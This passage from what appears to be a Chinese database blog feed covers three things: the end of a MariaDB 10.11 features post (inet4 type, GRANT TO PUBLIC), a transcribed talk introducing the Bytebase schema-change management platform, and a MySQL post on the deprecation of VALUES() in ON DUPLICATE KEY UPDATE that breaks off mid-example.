<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t_inet4 (a inet4);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.009</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">insert</span> t_inet4 <span class="keyword">select</span> (<span class="string">&#x27;0.0.0.0&#x27;</span>);</span><br><span class="line">Query OK, <span class="number">1</span> <span class="type">row</span> affected (<span class="number">0.003</span> sec)</span><br><span class="line">Records: <span class="number">1</span>  Duplicates: <span class="number">0</span>  Warnings: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">MariaDB [test]<span class="operator">&gt;</span> <span class="keyword">select</span> hex(a), a <span class="keyword">from</span> t_inet4;</span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> hex(a)   <span class="operator">|</span> a       <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">00000000</span> <span class="operator">|</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----------+---------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="5-TO-PUBLIC">5. TO PUBLIC</h3>
<p>从 mariadb 10.11 开始，支持 <code>to public</code> 语法，</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> <span class="operator">&lt;</span>privilege<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>object<span class="operator">&gt;</span> <span class="keyword">TO</span> PUBLIC;</span><br><span class="line"><span class="keyword">REVOKE</span> <span class="operator">&lt;</span>privilege<span class="operator">&gt;</span> <span class="keyword">ON</span> <span class="operator">&lt;</span>database<span class="operator">&gt;</span>.<span class="operator">&lt;</span>object<span class="operator">&gt;</span> <span class="keyword">FROM</span> PUBLIC;</span><br></pre></td></tr></table></figure></div>
<p>增加这个授权给所有用户，允许其登陆数据库。</p>
<p>demo:</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> grants <span class="keyword">for</span> public;</span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> Grants <span class="keyword">for</span> PUBLIC                                                                                                                                                                                                   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span>, <span class="keyword">CREATE</span>, <span class="keyword">DROP</span>, <span class="keyword">REFERENCES</span>, INDEX, <span class="keyword">ALTER</span>, <span class="keyword">CREATE</span> TEMPORARY TABLES, LOCK TABLES, <span class="keyword">CREATE</span> <span class="keyword">VIEW</span>, <span class="keyword">SHOW</span> <span class="keyword">VIEW</span>, <span class="keyword">CREATE</span> ROUTINE, EVENT, <span class="keyword">TRIGGER</span>, <span class="keyword">DELETE</span> HISTORY <span class="keyword">ON</span> `test`.<span class="operator">*</span> <span class="keyword">TO</span> PUBLIC    <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">GRANT</span> <span class="keyword">SELECT</span>, <span class="keyword">INSERT</span>, <span class="keyword">UPDATE</span>, <span class="keyword">DELETE</span>, <span class="keyword">CREATE</span>, <span class="keyword">DROP</span>, <span class="keyword">REFERENCES</span>, INDEX, <span class="keyword">ALTER</span>, <span class="keyword">CREATE</span> TEMPORARY TABLES, LOCK TABLES, <span class="keyword">CREATE</span> <span class="keyword">VIEW</span>, <span class="keyword">SHOW</span> <span class="keyword">VIEW</span>, <span class="keyword">CREATE</span> ROUTINE, EVENT, <span class="keyword">TRIGGER</span>, <span class="keyword">DELETE</span> HISTORY <span class="keyword">ON</span> `test\_<span class="operator">%</span>`.<span class="operator">*</span> <span class="keyword">TO</span> PUBLIC <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>MariaDB 10.11 这个版本虽然已经GA，但时间不长，全网分享内容较少，生产案例不多，所以如果新项目要上生产环境，则仍建议使用最新版本的 MariaDB 10.6。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >]]></content>
      <categories>
        <category>MariaDB</category>
      </categories>
      <tags>
        <tag>mariadb</tag>
        <tag>mariadb 10.11</tag>
        <tag>mariadb新特性</tag>
        <tag>mariadb 10.6</tag>
      </tags>
  </entry>
  <entry>
    <title>王长煜：Bytebase ——开发者友好的变更管理平台</title>
    <url>/2023/modb/modb-bytebase-intro/</url>
    <content><![CDATA[<blockquote>
<p>原文链接： <a class="link"   href="https://www.modb.pro/db/641052" >https://www.modb.pro/db/641052 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
</blockquote>
<blockquote>
<p>分享嘉宾：Bytebase 商业化负责人 王长煜<br>
整理：ACDU成员 少安</p>
</blockquote>
<h2 id="font-color-5844ec-导读-font"><font color="#5844ec">导读</font></h2>
<p>数据库的变更管理一直是产品迭代流程中的一块薄弱环节，伴随数据库类型和数据库实例的增多，集中式的数据库变更管理系统正逐步成为各企业刚需。【墨天轮数据库沙龙-数据库SQL工具专场】邀请到 Bytebase 商业化负责人王长煜，为大家带来《Bytebase——开发者友好的变更管理平台》主题分享，以下为演讲实录。</p>
<h2 id="font-color-5844ec-Bytebase-产品介绍-font"><font color="#5844ec">Bytebase 产品介绍</font></h2>
<h3 id="1、Bytebase-公司概况">1、Bytebase 公司概况</h3>
<p>Bytebase 是一款聚焦在团队协作场景下的数据库结构变更和版本管理的开源工具，主要解决研发工程师和 DBA（数据库管理员）在变更数据库结构时的协同问题。</p>
<p>创始人陈天舟曾在 Google 硅谷总部云数据库团队担任技术负责人，也是 Google 内部 PostgreSQL 和 MySQL 分支的主要维护者。联合创始人徐丹青曾任 Google 总部主任工程师，两次获得谷歌最高工程奖，参与并带领谷歌云的数据库和云服务基础设施的设计和研发。2021年，他俩共同创立 Bytebase 公司，确立产品开源路线，2022年正式启动了商业化工作，发布商业版，并保持两周一次的高速迭代版本的频次。</p>
<img  alt="1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-e7dcb710-c388-418a-b310-524d9ce88d01.png"
                      referrerpolicy="no-referrer"
                >
<p>图1 Bytebase 公司创始人</p>
<h3 id="2、Bytebase-产品价值">2、Bytebase 产品价值</h3>
<p>Bytebase 产品的核心价值在于数据库的变更管理，包括访问控制等相关的能力。Bytebase 对开发者更加友好，能够提升开发者的研发效能和研发效率。</p>
<h2 id="font-color-5844ec-Bytebase-设计理念-font"><font color="#5844ec">Bytebase 设计理念</font></h2>
<h3 id="1、数据库变更过程中的挑战">1、数据库变更过程中的挑战</h3>
<p>面对业务需求快速变化，难免会遇到各种各样的问题，常见的例子有：</p>
<p>1.多个团队一起去对数据库发起变更，需要解决一些冲突的问题，例如对多个SQL脚本的执行顺序进行梳理编排。</p>
<p>2.ISV（Independent Software Vendors ，意为“独立软件开发商”）的用户是私有化的环境，可能对本地数据库做了额外的变更，当新版应用发布的时候，就可能出现脚本冲突，或者对象冲突等，导致脚本的发布失败。</p>
<p>3.再如我们的应用有多个版本，不同的版本服务于不同的用户，那就需要我们维持对应的 Schema 版本也可能要有多套，而 Schema 可能又是由一堆脚本去组成，需要去维护这些脚本的执行顺序，甚至可能高级版本发现了个 bug，还要把这个对应的脚本再 Cherry pick 回低版本，这会导致我们的整个 Schema 的版本管理变得非常的困难。</p>
<p>4.还有，我们可能因为各种各样的原因，导致库里面一些对象（表、索引），不知道什么原因建的，在生产库不敢轻易删除，难以维护。</p>
<p>Bytebase 的出现有效应对上述这些挑战。</p>
<img  alt="2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-8b5932ba-3b7b-4dd2-8de7-47d6360d9ccb.png"
                      referrerpolicy="no-referrer"
                >
<p>图2 数据库变更中的挑战</p>
<h3 id="2、生产力工具-Bytebase">2、生产力工具 Bytebase</h3>
<p>日常研发过程中，我们需要各种生产力工具来提升效率，比如代码变更管理使用 GitLab，基础设施变更管理使用 Terraform。那面对数据库变更管理，我们可以用 Bytebase 来解决。</p>
<p>Bytebase 不仅仅是只面向DBA，它是一个面向研发组织设计的，面向DBA跟我们的开发团队去协作的DevOps 平台。正因为如此，Bytebase 非常注重和研发流程的整合，包括上游的代码仓库，下游的一些研发管理流程的平台等等，都做到了原生的集成。</p>
<img  alt="3.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-43207481-48bc-437a-9a8b-f979b77821b5.png"
                      referrerpolicy="no-referrer"
                >
<p>图3 生产力工具</p>
<p>Bytebase 提供了一整套完整的企业级的变更协同工作流，包括基于Web端的查询访问控制，一系列自动化的变更审核能力，多种灵活应对各种研发产品的发布能力，变更失败以后，可以快速回滚的能力，以及对变更Schema的版本管理和变更历史记录。</p>
<p>Bytebase 提供了一套完整的解决方案，目前基本上对主流的数据库都实现了支持，包括下图未列出的Redshift, MariaDB, SQL Server 也都实现了支持。</p>
<img  alt="4.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-69c234d0-c638-4978-bf03-17da345c9716.png"
                      referrerpolicy="no-referrer"
                >
<p>图4 Bytebase 实现协同工作</p>
<h3 id="3、开发者友好的变更管理工具">3、开发者友好的变更管理工具</h3>
<p>对开发者友好的变更管理平台，是好用的，易用的，能够提升开发效率的，而非简单的提供一个管控平台，从而大幅度牺牲了效率。当前业务面临非常激烈的竞争，如果发布流程不够敏捷，或者说因为管控影响了我们业务研发效率，可能带来的损失也是非常大的。所以我们希望既能够保证我们的安全管控，又能够进一步提升研发的效率，这是 Bytebase 想要做到的。</p>
<p>那如何才能打造一个开发者友好的变更管理工具呢？Bytebase给出了解决方案。</p>
<p>1.基于 Web 端， Bytebase 按照DBA和研发者的一个协同作为核心去设计的，而不是简单的管控。</p>
<p>2.Bytebase 需要跟一些开发者常用的一些自动化部署工具去集成，比如说代码仓库GitLab GitHub，还有比如说 Terraform 等等。</p>
<p>3.针对研发在真实生产环境中，各种各样的场景去设计更加灵活和强大的发布方案。</p>
<p>4.以风险视角为中心的全局的管控操作流程。它的优点在于可以帮助我们按照风险去定义不同的安全策略，避免用一套策略应对所有的场景，导致研发效率的大幅度下降。</p>
<h3 id="4、基于项目的管理体系设计">4、基于项目的管理体系设计</h3>
<p>Bytebase 会把所有的库和相应的人员按照不同的项目进行划分，这个项目可能是一个产品线，一个部门，一个研发组织等等。在项目内部，研发团队可以自助在此发起一系列的变更，而我们的DBA、SRE团队在全局进行一个策略的制定和管控，然后这些策略就通过我们的产品落地。只要你不违反我的策略，那么在项目内部，所有的变更审批管理流程，可以由您的研发团队自助式的完成，而我们的DBA，它更多是作为管理者以及兜底的角色。由此，DBA可以释放出大量的时间，去做一些更高价值的工作，比如说 Schema 设计工作，好的schema设计方案，可以将很多运维问题提前解决掉。</p>
<p>以项目为管理边界，去进行自助化的管理，这是实现 DevOps 的一个前提。</p>
<img  alt="5.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-b5711c56-b687-419f-9e41-824795da2cc2.png"
                      referrerpolicy="no-referrer"
                >
<p>图5 基于项目的管理体系设计</p>
<h3 id="5、基于安全协同理念设计的SQL查询客户端">5、基于安全协同理念设计的SQL查询客户端</h3>
<p>Bytebase 会把所有的 SQL 访问收口，以提供更安全的SQL开发能力。在客户端中实现数据库的查询访问控制与数据脱敏。</p>
<img  alt="6.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-95b7c86d-44d7-48ca-a118-da33156bbb3c.png"
                      referrerpolicy="no-referrer"
                >
<p>图6 基于安全协同理念设计</p>
<h3 id="6、GitOps-实践方案">6、GitOps 实践方案</h3>
<ul>
<li>基于脚本</li>
</ul>
<p>这是我们最常用到的变更模式，由一个个变更脚本组成，按顺序执行。这种方案最大的好处就是，非常清楚的知道这次变更做了什么，过程透明可控。并且因为它是基于 SQL 的，所有的数据库都能够支持。缺点也很明显，就是可能需要维护大量的脚本的执行顺序，还要解决冲突问题，假设是多个团队甚至有跨国团队，如果说 Schema 有多个版本，应用上对应好几个版本，这时候要去维护这么多脚本的执行情况，甚至会出现顺序出错或者遗漏的情况，进而严重影响了整个发布效率。</p>
<img  alt="7.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-cac78727-9a73-4b5b-947f-d98ea1790041.png"
                      referrerpolicy="no-referrer"
                >
<p>图7 基于脚本的数据库变更管理方案</p>
<ul>
<li>基于终态</li>
</ul>
<p>这是 Bytebase 提供了一种新型的变更模式。您不再需要写变更脚本，只需要去编辑存在代码仓库里面的唯一一份 schema 文件，改成什么样子，那么目标库由 Bytebase 把它变成对应的样子。所以这种模式，它的优点就是不再需要写 SQL，不需要管理执行顺序，而是声明式的，当然也有些局限性，比如说不能支持 DML，不能支持 RENAME。另外需要有对应的数据库引擎能够支持，目前 Bytebase 优先实现了针对 MySQL 的这种模式的变更，后续我们支持PostgreSQL。</p>
<p>这种基于终态的模式，特别适合跟 GitOps 集成，只需要单一事实来源文件（SSOT）在代码仓库里面，利用代码仓库的能力，就能保证这个文件的一致性和唯一性，那么我的库就不会出现偏差或者脱离管控的对象等等情况。</p>
<p>在Google内部，所有的变更针对数据库的变更，全部是用利用这种模式来做的。</p>
<img  alt="8.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-829c574a-874f-466f-8780-292aac0c3d63.png"
                      referrerpolicy="no-referrer"
                >
<p>图8 基于终态的数据库变更管理方案</p>
<ul>
<li>强大的 SQL 审核能力</li>
</ul>
<p>Bytebase 也提供了非常强大的 SQL 的审核能力，目前优先支持了 MySQL、PG、TiDB、Oracle 以及 Oceanbase。并提供了多种的审核方案，包括在UI对工单审核，可以调接口来审核。最特殊的，Bytebase 审核能力也跟代码仓库做了集成，可以在代码仓库里面实行审核，比如说在 GitLab 或者 GitHub 里面提交一个PR或者MR，那么只要这里面包含SQL脚本，或者说是大家常用的 MyBatis 里的 XML 文件，都能帮你识别到，然后就在代码仓库里面够触发对应的审核，只有通过审核了，才能够合并到指定的分支。</p>
<img  alt="9.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-b23faee9-e628-4b69-bb82-86fb9a6ce296.png"
                      referrerpolicy="no-referrer"
                >
<p>图9 强大的SQL审核能力</p>
<p>这种模式的优点有二：第一特别符合开发团队的工作习惯，我们知道开发团队他不想拿着一个 SQL 粘贴到多个工具，是非常繁琐的事情。第二这种模式把整个审核流程左移了，在CI阶段就触发了审核流程，而这个审核规范，是在我们的UI里面配置的，及时生效保证两边用同一套规范，比如说在上线的很早之前就能够触发审核，而不是需要到发布的那一刻再来审核了，增加了容错的时间。这是我们把审核能力融入代码仓库里面的一个非常关键的一个作用。</p>
<img  alt="10.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-92032e3e-74d2-465c-8794-b7858480c01e.png"
                      referrerpolicy="no-referrer"
                >
<p>图10 审核能力融入代码仓库</p>
<ul>
<li>多种发布模式</li>
</ul>
<p>Bytebase 提供了多种的发布模式：</p>
<p>1）单库发布</p>
<p>2）批量发布<br>
这种一般针对SaaS公司，有大量的多租户库，分库分表，像一些工厂管理系统，还有一些 ISV，可能有多个用户的环境要部署等等。这种批量发布的库其实都是同构的，使用这种发布模式能够方便的进行发布。</p>
<p>3）分阶段发布<br>
就流水性的发布模式，可以应对于多种情况，比如说可以从开发、测试、预上线、生产流水发布，您只要一个 SQL 工单，他可以逐阶段发布下去，避免了开发阶段提交的变更，可能经过测试通过了，但是往生产发的时候漏发、错发等等情况，我们通过分阶段发布去解决。再比如说，我们可能有多租户的大量的业务，这时候可能先挑一部分去做一些灰度上线，先把应用在几个客户上面先发布，没有问题了我再发布到剩余的客户去，可以把一次发布分成多个阶段来做，也是没有问题的。</p>
<p>4）跨环境发布<br>
一般来说，应对于这种物理隔离的一个场景，或者说要把变更发布到用户的私有化环境中去，这时候把脚本导出来，再到那边去发布，所以我们提供了多种多样的发布能力。</p>
<img  alt="11.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-14cc5fa9-e6b6-44e8-aabe-4c9123f99175.png"
                      referrerpolicy="no-referrer"
                >
<p>图11 多种发布模式</p>
<p>5） 风险驱动的数据库变更管理流程<br>
Bytebase 会把所有的数据库操作，按照不同的规则去定义风险等级。举个例子，当生产环境影响的行数超过1万行，操作类型是 update 或者 delete 的时候，Bytebase 认为它是一个高风险的操作。定义了高风险的操作，Bytebase会标记它的风险等级，然后根据风险等级去关联你的自定义的审批流程，然后再基于这个审批流程，触发对应的审批流与发布流程。</p>
<img  alt="12.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-bdb4871b-8e11-4295-a14c-f620a8865d52.png"
                      referrerpolicy="no-referrer"
                >
<p>图12 风险驱动的数据库变更管理流程</p>
<p>通过这种模式把我们所有的数据库操作去定义不同的风险，来灵活的关联不同的审批流，那么比如说研发的一些测试环境或者是预上线环境，风险等级就可以低一些，用一些比较简单的审批流；如果说是一些比较高危的操作，可以指定一个非常复杂的审批流，或者说要有一些DBA参与。再有，一些开发环境就跳过审批，自动化执行就可以了。通过这种方式就可以把我们所有的变更，进行非常灵活的管控，让整个研发的效率进一步的提升。</p>
<img  alt="13.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-d069ef29-1b5b-4a5a-b5d4-5f275491bcde.png"
                      referrerpolicy="no-referrer"
                >
<p>图13 基于风险的审批流程示例</p>
<h3 id="7、与-IM-集成">7、与 IM 集成</h3>
<p>Bytebase 所有的变更都会跟 IM 集成，随时把控进度。目前 Bytebase 集成了主流的IM，针对自定义的也能够集成，我们可以收到所有的变更状态改变的通知。针对飞书，还实现了基于飞书端的移动端审批，如果说这个工单没有任何报错，可以直接进行审批；如果有报错，建议登到控制台做一个仔细的检查。</p>
<img  alt="14.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-83f123ee-f811-42a3-bc51-ba578f868634.png"
                      referrerpolicy="no-referrer"
                >
<p>图14 Bytebase与IM集成</p>
<h3 id="8、基于时间点的恢复-闪回">8、基于时间点的恢复+闪回</h3>
<p>如果变更失败了， Bytebase 有一系列的手段去解决，目前我们这边内置了一种基于时间点的快速恢复，针对 MySQL 可以做好备份，一旦出了问题可以按照库级别实现一个时间点的恢复。另外我们还可以针对 DML 的语句级别实现一个快速闪回。包括 MySQL 和 Oracle 都支持这种模式，比如说写了一条 delete 语句，一不小心多删了很多行，那么 Bytebase 可以一键生成对应的 UNDO SQL，自动生成对应的工单，审批一下如果没有问题，就可以快速找回数据，这是 Bytebase 提供的一个变更失败的兜底保障。当然，Bytebase 内部还集成了很多这样的高级能力，比如针对 MySQL 的大表变更，提供了基于 gh-ost 的 Online DDL 能力等等，这些都帮助我们更好、更高效的完成整个变更流程。</p>
<img  alt="15.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-525a8ddd-112a-4b1f-bb85-e10c537fef3a.png"
                      referrerpolicy="no-referrer"
                >
<p>图15 基于时间点的恢复和闪回</p>
<p>最终变更完成以后 Bytebase 会把所有的变更记录全部记下来，包括您变更的历史，以及每一次变更前变更后完整的结构快照以及它的差异。这样的好处，一来可以快速的追溯和审计，二来可以在每一次变更版本中，直接找到当时的 Schema。比如说要还原某个版本，要做一些测试，那么不再需要去跑一堆脚本了，可以直接找到当时那个工单做完以后 Schema 快照，整个库的 Schema 就在这里了，通过这种方式我们可以管理一系列的变更版本。</p>
<img  alt="16.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-4e4b99dd-cd39-4d1e-a659-3bb5af318500.png"
                      referrerpolicy="no-referrer"
                >
<p>图16 变更记录可追溯审计</p>
<h2 id="font-color-5844ec-场景示例-font"><font color="#5844ec">场景示例</font></h2>
<h3 id="1、场景示例：一个完整的-Database-CI-CD的流程">1、场景示例：一个完整的 Database CI/CD的流程</h3>
<p>以前我们 CI/CD 只能做到应用代码的 CI/CD，后来有些工具比如 Flyway、Liquibase ，它的做法是把数据库脚本直接打到应用镜里面一起跑，但是对我们DBA来说，一旦数据库很大，那么这个变更流程就可能出错，一旦出错，整个应用的发布就挂在那里，必须重新修改脚本，又要重新打包整个应用镜像，所以一旦数据库大一些，就不能采用那种模式了。需要将应用发布和数据库发布解耦，解耦出来的结果就是，应用自动化发布，数据库手动发布，整个过程是割裂的。如果沟通不畅，可能应用发出去，数据库变更还没有跑完，应用就各种报错了。</p>
<p>那 Bytebase 是怎么实现的呢，首先我们可以在代码仓库里面同时提交应用的代码和数据库的脚本，然后自动触发数据库在代码仓库内的审核，team leadr 确认没有问题后，才允许合并到指定分支，此时，应用代码就会触发应用的 CI/CD 的流程，先做build再做test，然后会有个节点，这个节点就是会读取我们这次变更的版本号，然后通过 API 去 Bytebase 的控制台 查询这个任务的状态，同时，数据库的变更脚本就会在 Bytebase 生成内部的执行工单，应用就会在等待不断查询它的状态，这时需要跑 Bytebase 数据库的审核和变更流程，如果有问题，我们在数据库这边去对应的做一些处理，直到把问题解决；如果没问题就会自动发布，一旦发布完成，应用的 CI/CD 流程的 pipeline 里面就会接收到这个信息，就可以触发应用下游的发布，全流程可以打通串联起来。同时 Bytebase 会把我们这次变更完成以后完整的 schema 再回写会代码仓库。</p>
<p>上述就是一个典型的 Bytebase 的 CI/CD 流程。</p>
<img  alt="17.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-1b940d87-5a35-4566-869d-ddd51447e917.png"
                      referrerpolicy="no-referrer"
                >
<p>图 17 场景示例1</p>
<h3 id="2、场景示例：多租户数据库的变更管理流程">2、场景示例：多租户数据库的变更管理流程</h3>
<p>关于这个示例，Bytebase 有个金融行业的 SaaS 用户，已经在生产环境中使用。当他们在业务方发起新业务，或者说新进客户的时候，会由业务同学去新建个租户，这个租户包括应用侧、业务侧，并且后台会自动创建新的数据库。这个新的数据库，会调用 Bytebase 的接口，自动创建这个库并且自动化纳管，由 Bytebase 把它的结构同步到最新，用户的账号和密码由 Vault 管理，应用代码去 Vault 获取账号密码，再把初始化数据写入进去。如此，SRE、应用开发人员可以基于 Bytebase 去管理整个变更流程。</p>
<img  alt="18.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-b3b18d0b-f080-4079-9777-9f7128b41da6.png"
                      referrerpolicy="no-referrer"
                >
<p>图18 场景示例2</p>
<h2 id="font-color-5844ec-总结-font"><font color="#5844ec">总结</font></h2>
<p>目前 Bytebase 正处于高速发展阶段，在这个领域中，是全球唯一同时入选 CNCF 以及平台工程组织(<a class="link"   href="http://platformengineering.org" >platformengineering.org <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)推荐目录的产品。同时Bytebase 面向全球化运营，在海外有大量的用户，Bytebase支持英语、中文以及西班牙语。Bytebase 入选了2022年球开源初创企业增速 TOP 50。以上就是我今天分享的全部内容，谢谢大家！</p>
<img  alt="19.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20230606-46aeeac8-b5ef-4fdc-a799-b74540282456.png"
                      referrerpolicy="no-referrer"
                >
<p>图 19 Bytebase 功能架构栈</p>
<hr>
<p><a class="link"   href="https://www.modb.pro/db/641052" >https://www.modb.pro/db/641052 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
      <categories>
        <category>墨天轮</category>
      </categories>
      <tags>
        <tag>modb</tag>
        <tag>bytebase</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 管理运维：这类 VALUES() 已被弃用</title>
    <url>/2023/mysql/mysql-8.0.20-values-deprecated/</url>
    <content><![CDATA[<p>在之前的文章 <a href="https://shawnyan.cn/2023/mysql/mysql-8-case-datetime-default/">MySQL 管理运维：妙用 DATETIME 数据类型的默认值</a> 中，介绍了如何巧用自动更新字段时间戳。</p>
<p>本文将继续扩展该案例，使用 <code>INSERT ... ON DUPLICATE KEY UPDATE</code> 语句来检查记录用户登录情况。</p>
<h2 id="背景">背景</h2>
<p>用户登录数据库的时间、次数，执行的语句，都是重要的审计项目。在老版本的 MySQL 中没有记录用户密码最后更改时间和用户最后登录时间，需要依靠外挂工具实现。</p>
<p>在 MySQL 8 中，系统表 <code>mysql.user</code> 的 <code>password_last_changed</code> 字段记录了密码最后更改时间，但用户最后登录时间仍较难查询。</p>
<p>好在，performance_schema 库中的 users 表记录了所有用户的总连接次数。</p>
<blockquote>
<p>users 表为连接到 MySQL 服务器的每个用户包含一行。对于每个用户名，该表计算当前连接数和总连接数。 表大小在服务器启动时自动调整大小。要显式设置表大小，请在服务器启动时设置Performance_schema_users_size 系统变量。 要禁用用户统计信息，请将此变量设置为 0。<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p>
</blockquote>
<p>假设我们有个以“天”为单位粒度的需求，要求记录每个用户上次登录数据库是哪一天。</p>
<h2 id="实现">实现</h2>
<p>对于该需求，我们可以创建一张新表 myuser，该表记录用户名 user，总连接次数 total_conn，和更新时间 update_at。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table myuser(</span><br><span class="line">user char(32) primary key,</span><br><span class="line">total_conn bigint,</span><br><span class="line">update_at datetime DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP</span><br><span class="line">);</span><br></pre></td></tr></table></figure></div>
<p>创建一个事件 myevent，每天零时从 <code>performance_schema.users</code> 抽取数据写入到 myuser 表。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE EVENT myuser_daily</span><br><span class="line">  ON SCHEDULE EVERY DAY</span><br><span class="line">DO</span><br><span class="line">  xxx</span><br></pre></td></tr></table></figure></div>
<h2 id="VALUES">VALUES()</h2>
<p>这里，将用到 <code>INSERT ... ON DUPLICATE KEY UPDATE</code>，该语句允许你插入一行数据，但如果遇到重复的主键或唯一键约束，它会更新现有的行而不是抛出错误。</p>
<p>我们可以使用 <code>VALUES()</code> 方法来更新数据：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO myuser (user,total_conn) VALUES (&#x27;shawnyan&#x27;,1) </span><br><span class="line">ON DUPLICATE KEY UPDATE total_conn = values(total_conn);</span><br></pre></td></tr></table></figure></div>
<p>这里的第二个 VALUES() 是一个特殊的函数，它返回 INSERT 语句中对应的列的值。这允许你引用你试图插入的值，而不是表中的现有值。</p>
<p>但从 MySQL 8.0.20 开始，该函数的用法被废弃，并在未来的版本中移除。继续使用会抛出如下告警：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning (Code 1287): &#x27;VALUES function&#x27; is deprecated and will be removed in a future release. Please use an alias (INSERT INTO ... VALUES (...) AS alias) and replace VALUES(col) in the ON DUPLICATE KEY UPDATE clause with alias.col instead</span><br></pre></td></tr></table></figure></div>
<p>建议使用别名来代替。<sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup></p>
<p>具体用法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert myuser(user,total_conn) </span><br><span class="line">select USER,TOTAL_CONNECTIONS </span><br><span class="line">from performance_schema.users AS new </span><br><span class="line">where new.user is not null</span><br><span class="line">ON DUPLICATE KEY UPDATE total_conn = new.TOTAL_CONNECTIONS;</span><br></pre></td></tr></table></figure></div>
<p>输出：</p>
